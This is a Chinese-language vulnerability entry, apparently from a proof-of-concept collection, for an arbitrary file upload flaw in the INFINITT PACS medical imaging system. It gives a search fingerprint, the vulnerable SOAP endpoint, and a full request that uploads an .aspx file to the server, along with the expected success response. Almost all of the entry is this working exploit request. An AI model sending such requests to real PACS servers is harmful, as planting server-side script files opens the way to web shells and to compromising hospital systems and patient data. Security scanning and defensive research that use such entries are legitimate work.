# 英飞达影像存档与通讯PACS系统INFINITT_PACS任意文件上传漏洞

英飞达影像存档与通讯PACS系统INFINITT_PACS ｜ 文件上传 ｜ —
- **指纹**：`"INFINITT"`
- **请求**：`POST /webservices/WebJobUpload.asmx HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<jobUpload xmlns="http://rainier">
<vcode>1</vcode>
<subFolder></subFolder>
<fileName>dudesuite.aspx</fileName>
<bufValue>MTIz</bufValue>
</jobUpload>
</soap:Body>
</soap:Envelope>
```
- **响应特征**：200 jobUploadResult